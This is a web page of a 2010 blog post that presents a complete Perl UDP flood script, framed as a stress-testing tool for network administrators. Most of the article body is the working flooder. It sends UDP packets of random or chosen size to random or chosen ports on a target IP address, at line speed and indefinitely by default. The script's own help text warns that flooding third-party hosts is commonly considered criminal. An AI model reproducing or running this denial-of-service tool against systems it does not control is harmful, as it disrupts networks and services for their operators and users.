<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-3282416-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>UDP Flood Script | Linhost.info</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="There are some situations when network and system administrator(s) may need to UDP flood network devices with the purpose of testing them under stress. The preferred method I use is by means of a Perl">
<meta property="og:type" content="article">
<meta property="og:title" content="UDP Flood Script">
<meta property="og:url" content="http://linhost.info/2010/05/udp-flood-script/index.html">
<meta property="og:site_name" content="Linhost.info">
<meta property="og:description" content="There are some situations when network and system administrator(s) may need to UDP flood network devices with the purpose of testing them under stress. The preferred method I use is by means of a Perl">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2010-05-11T05:04:15.000Z">
<meta property="article:modified_time" content="2020-08-09T09:07:53.611Z">
<meta property="article:tag" content="script">
<meta property="article:tag" content="udp">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Linhost.info" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <!--<div id="banner"></div>-->
  <div id="header-outer" class="outer">
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        <a href="/" id="main-nav-title" class="main-nav-link">Linhost.info</a>
        
      </nav>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-udp-flood-script" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/General/">General</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      UDP Flood Script
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>There are some situations when network and system administrator(s) may need to <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/UDP_flood_attack">UDP flood</a> network devices with the purpose of testing them under stress. The preferred method I use is by means of a Perl script created by <a target="_blank" rel="noopener" href="http://www.ioshints.info/About_Ivan_Pepelnjak">Ivan Pepelnjak</a> from <a href="ioshints.info">ioshints.info</a>. The script is highly configurable allowing the user to dictate the amount of bandwidth to be used during the flood, and the port to name a few. <strong>Note:</strong> <em>Windows users will need to install either</em> <a target="_blank" rel="noopener" href="http://www.activestate.com/activeperl/">ActivePerl</a> <em>or</em> <a target="_blank" rel="noopener" href="http://strawberryperl.com/">Strawberry Perl</a>.</p>
<h4 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h4><p>flood.pl –port port –size bytes –time seconds –bandwidth kbps –delay msec target-ip-address</p>
<p>In its simplest form you can ignore the extra parameters and issue:</p>
<p>script_name.pl 192.168.1.10</p>
<p>For an explanation of the parameters visit <a target="_blank" rel="noopener" href="http://wiki.nil.com/UDP_flood_in_Perl">wiki.nil.com/UDP_flood_in_Perl</a>.</p>
<h4 id="Script-Source-Code"><a href="#Script-Source-Code" class="headerlink" title="Script Source Code"></a>Script Source Code</h4><p>#!/usr/bin/perl<br>#####################################################</p>
<h1 id="udp-flood"><a href="#udp-flood" class="headerlink" title="udp flood."></a>udp flood.</h1><p>######################################################</p>
<p>use Socket;<br>use strict;<br>use Getopt::Long;<br>use Time::HiRes qw( usleep gettimeofday ) ;</p>
<p>our $port = 0;<br>our $size = 0;<br>our $time = 0;<br>our $bw   = 0;<br>our $help = 0;<br>our $delay= 0;</p>
<p>GetOptions(<br>    “port=i” =&gt; $port,        # UDP port to use, numeric, 0=random<br>    “size=i” =&gt; $size,        # packet size, number, 0=random<br>    “bandwidth=i” =&gt; $bw,        # bandwidth to consume<br>    “time=i” =&gt; $time,        # time to run<br>    “delay=f”=&gt; $delay,        # inter-packet delay<br>    “help|?” =&gt; $help);        # help</p>
<p>my ($ip) = @ARGV;</p>
<p>if ($help || !$ip) {<br>  print &lt;&lt;’EOL’;<br>flood.pl –port=dst-port –size=pkt-size –time=secs<br>         –bandwidth=kbps –delay=msec ip-address</p>
<p>Defaults:<br>  * random destination UDP ports are used unless –port is specified<br>  * random-sized packets are sent unless –size or –bandwidth is specified<br>  * flood is continuous unless –time is specified<br>  * flood is sent at line speed unless –bandwidth or –delay is specified</p>
<p>Usage guidelines:<br>  –size parameter is ignored if both the –bandwidth and the –delay<br>    parameters are specified.</p>
<p>  Packet size is set to 256 bytes if the –bandwidth parameter is used<br>    without the –size parameter</p>
<p>  The specified packet size is the size of the IP datagram (including IP and<br>  UDP headers). Interface packet sizes might vary due to layer-2 encapsulation.</p>
<p>Warnings and Disclaimers:<br>  Flooding third-party hosts or networks is commonly considered a criminal activity.<br>  Flooding your own hosts or networks is usually a bad idea<br>  Higher-performace flooding solutions should be used for stress/performance tests<br>  Use primarily in lab environments for QoS tests<br>EOL<br>  exit(1);<br>}</p>
<p>if ($bw &amp;&amp; $delay) {<br>  print “WARNING: computed packet size overwrites the –size parameter ignoredn”;<br>  $size = int($bw * $delay / 8);<br>} elsif ($bw) {<br>  $delay = (8 * $size) / $bw;<br>}</p>
<p>$size = 256 if $bw &amp;&amp; !$size;</p>
<p>($bw = int($size / $delay * 8)) if ($delay &amp;&amp; $size);</p>
<p>my ($iaddr,$endtime,$psize,$pport);<br>$iaddr = inet_aton(“$ip”) or die “Cannot resolve hostname $ipn”;<br>$endtime = time() + ($time ? $time : 1000000);<br>socket(flood, PF_INET, SOCK_DGRAM, 17);</p>
<p>print “Flooding $ip “ . ($port ? $port : “random”) . “ port with “ .<br>  ($size ? “$size-byte” : “random size”) . “ packets” . ($time ? “ for $time seconds” : “”) . “n”;<br>print “Interpacket delay $delay msecn” if $delay;<br>print “total IP bandwidth $bw kbpsn” if $bw;<br>print “Break with Ctrl-Cn” unless $time;</p>
<p>die “Invalid packet size requested: $sizen” if $size &amp;&amp; ($size &lt; 64 || $size &gt; 1500);<br>$size -= 28 if $size;<br>for (;time() &lt;= $endtime;) {<br>  $psize = $size ? $size : int(rand(1024-64)+64) ;<br>  $pport = $port ? $port : int(rand(65500))+1;</p>
<p>  send(flood, pack(“a$psize”,”flood”), 0, pack_sockaddr_in($pport, $iaddr));<br>  usleep(1000 * $delay) if $delay;<br>}</p>
<ul>
<li>Orginal script can be found at <a target="_blank" rel="noopener" href="http://wiki.nil.com/UDP_flood_in_Perl">wiki.nil.com</a>.</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://linhost.info/2010/05/udp-flood-script/" data-id="ckitzx0f600qqh3fx9qnugv46" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/script/" rel="tag">script</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/udp/" rel="tag">udp</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2010/05/compare-hashes-with-md5deep-part-2/" id="article-nav-newer" class="article-nav-link-wrap">
      <span class="article-nav-caption">Newer</span>
      <div class="article-nav-title">
        
          Compare Hashes With md5deep - Part 2
        
      </div>
    </a>
  
  
    <a href="/2010/05/tune2fs-quick-tips/" id="article-nav-older" class="article-nav-link-wrap">
      <span class="article-nav-caption">Older</span>
      <div class="article-nav-title">Tune2fs Quick Tips</div>
    </a>
  
</nav>

  
</article>

</section>
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Linhost.info<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>